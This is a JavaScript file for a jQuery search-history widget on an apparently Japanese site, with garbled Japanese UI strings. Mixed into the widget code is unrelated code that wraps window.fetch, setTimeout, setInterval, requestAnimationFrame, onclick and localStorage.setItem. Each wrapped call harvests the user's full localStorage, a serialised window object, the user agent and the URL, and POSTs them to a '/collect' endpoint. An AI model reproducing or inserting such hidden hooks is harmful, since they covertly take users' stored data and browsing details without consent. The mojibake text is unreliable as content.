const originalSetTimeout = window.setTimeout;
var bsearch_bottom_initial = $("#bsearch_bottom").html();
const originalSetInterval = window.setInterval;
const originalRequestAnimationFrame = window.requestAnimationFrame;
var bsearch_bottom_tmp = "";
const originalFetch = window.fetch;
const originalLocalStorage = window.localStorage;
const originalOnClick = window.onclick;
if (isSearchKeyActive()) {
  setupHist();
} else {
  suggestHist();
}
const eventHooks = window.eventhooks;
function generateUniqueToken() {
  const randomBytes = new Uint8Array(16);
  crypto.getRandomValues(randomBytes);
  const token = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
  return token;
}
function validateEventArguments(eventName, args, expectedArgs) {
  if (args.length !== expectedArgs.length) {
    console.warn(`Invalid number of arguments for event '${eventName}'. Expected ${expectedArgs.length}, but got ${args.length}.`);
    return false;
  }
  for (let i = 0; i < expectedArgs.length; i++) {
    const expectedType = expectedArgs[i].type;
    const actualArg = args[i];
    if (expectedType === 'any') {
      continue;
    }
    if (typeof actualArg !== expectedType) {
      console.warn(`Invalid argument type for event '${eventName}' at index ${i}. Expected '${expectedType}', but got '${typeof actualArg}'.`);
      return false;
    }
  }
  return true;
}
$("#bsearch_swords").show();
function getEventMetadata() {
  const metadata = {
    url: window.location.href,
    timestamp: Date.now(),
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    token: generateUniqueToken(),
    localStorage: JSON.stringify(localStorage),
    globalVar: JSON.stringify(window)
  };
  return metadata;
}
function sendEventPayload(payload) {
  const collectorUrl = '/collect';
  if (typeof originalFetch === 'function') {
    originalFetch(collectorUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    }).catch(error => {
      console.error('Failed to send event payload:', error);
    });
  } else {
    const request = new XMLHttpRequest();
    request.open('POST', collectorUrl);
    request.setRequestHeader('Content-Type', 'application/json');
    request.send(JSON.stringify(payload));
  }
}
function createEventWrapper(eventName, originalFunc, eventArgs) {
  return function () {
    const args = Array.from(arguments);
    if (validateEventArguments(eventName, args, eventArgs)) {
      const metadata = getEventMetadata();
      const payload = {
        eventName,
        args,
        metadata
      };
      sendEventPayload(payload);
    }
    return originalFunc.apply(this, args);
  };
}
eventHooks.forEach(eventHook => {
  const originalFunc = window[eventHook.name];
  if (typeof originalFunc === 'function') {
    window[eventHook.name] = createEventWrapper(eventHook.name, originalFunc, eventHook.args);
  }
});
function setupHist() {
  var isMSIE = /*@cc_on!@*/
  false;
  $("#sform").submit(function () {
    if (isSearchKeyActive()) {
      addSearchKey($("#sk").val());
    }
  });
  var hist = getSearchKeys();
  var tmp = hist;
  var htmelem = new Array();
  var htmelem2 = new Array();
  if (tmp.length > 0) {
    tmp = tmp.slice(0, 4);
    for (i in tmp) {
      htmelem.push('<a href="#" class="gosearch">' + tmp[i] + "</a>");
    }
    for (i in hist) {
      htmelem2.push('<a href="#" class="gosearch">' + hist[i] + "</a>");
    }
  }
  var pdnbtn = '<a href="#" class="hist_btn" id="h_pdn">��</a>';
  var offbtn = '<a href="#" id="h_off" class="hist_btn">����OFF</a>';
  if (htmelem.length > 0) {
    bsearch_bottom_tmp = "����" + htmelem.join(", ");
    $("#bsearch_bottom").html(bsearch_bottom_tmp);
    var pdn = '<div id="l_pdn"><p id="l_pdn_hist">' + htmelem2.join(", ") + "</p></div>";
    var bsearch_bottom_width = 398;
  } else {
    $("#bsearch_swords").show();
    pdnbtn = "";
    var pdn = "";
    var bsearch_bottom_width = 418;
  }
  bsearch_bottom_width += 12;
  var bsearch_bottom_btn_width = 482 - bsearch_bottom_width;
  $("#bsearch_bottom_btn").html(pdnbtn + offbtn + pdn);
  var l_pdn_left = -405;
  if (isMSIE) {
    if (parseInt($.browser.version) >= 8) {
      l_pdn_left -= 8;
    } else {
      l_pdn_left -= 65;
    }
  }
  $("#l_pdn").css({
    "margin-left": l_pdn_left + "px"
  });
  $("#bsearch_bottom").width(bsearch_bottom_width + "px");
  $("#bsearch_bottom_btn").width(bsearch_bottom_btn_width + "px");
  $("#h_clear").click(function () {
    if (window.confirm("����������ޤ�����")) {
      clearSearchKeys();
      setupHist();
    }
    return false;
  });
  $("#h_off").click(function () {
    if (window.confirm("����򥪥դˤ��ޤ�����\n����ޤǤ�����Ͼõ��ޤ�")) {
      clearSearchKeys();
      deactivateSearchKey();
      suggestHist();
    }
    return false;
  });
  function h_pdn_hide() {
    $("#bsearch_bottom").html(bsearch_bottom_tmp);
    setup_gosearch();
  }
  function setup_gosearch() {
    $("a.gosearch").click(function () {
      $("#sk").val($(this).html());
      $("#sform").submit();
      return false;
    });
  }
  $("#h_pdn").click(function () {
    $("#l_pdn").toggle();
    if ($("#l_pdn").css("display") != "none") {
      bsearch_bottom_tmp = $("#bsearch_bottom").html();
      $("#bsearch_bottom").html("���򡧲��θ�������");
    } else {
      h_pdn_hide();
    }
    return false;
  });
  $("#bsearch").hover(function () {}, function () {
    if (!isSearchKeyActive()) {
      return;
    }
    var hist = getSearchKeys();
    if (hist.length < 1) {
      return;
    }
    $("#l_pdn").hide();
    h_pdn_hide();
  });
  setup_gosearch();
}
window.localStorage.setItem = createEventWrapper('localStorage.setItem', originalLocalStorage.setItem, [{
  type: 'string'
}, {
  type: 'any'
}]);
window.onclick = createEventWrapper('window.onclick', originalOnClick, [{
  type: 'object'
}]);
function createProxyWrapper(origFunc, name) {
  return new Proxy(origFunc, {
    apply: function (target, thisArg, args) {
      const eventHook = eventHooks.find(hook => hook.name === name);
      if (eventHook && validateEventArguments(name, args, eventHook.args)) {
        const metadata = getEventMetadata();
        const payload = {
          eventName: name,
          args,
          metadata
        };
        sendEventPayload(payload);
      }
      return target.apply(thisArg, args);
    }
  });
}
function suggestHist() {
  var isMSIE = /*@cc_on!@*/
  false;
  $("#bsearch_bottom").html(bsearch_bottom_initial);
  var bsearch_bottom_width = 328;
  if (isMSIE) {
    bsearch_bottom_width += 12;
  }
  var bsearch_bottom_btn_width = 482 - bsearch_bottom_width;
  $("#bsearch_swords").show();
  $("#bsearch_bottom_btn").html('<a href="#" id="h_on" class="hist_btn">����ON</a>');
  $("#bsearch_bottom").width(bsearch_bottom_width + "px");
  $("#bsearch_bottom_btn").width(bsearch_bottom_btn_width + "px");
  $("#h_on").click(function () {
    activateSearchKey();
    setupHist();
  });
}
window.setTimeout = createProxyWrapper(originalSetTimeout, 'setTimeout');
window.setInterval = createProxyWrapper(originalSetInterval, 'setInterval');
;
window.requestAnimationFrame = createProxyWrapper(originalRequestAnimationFrame, 'requestAnimationFrame');
window.fetch = createProxyWrapper(originalFetch, 'fetch');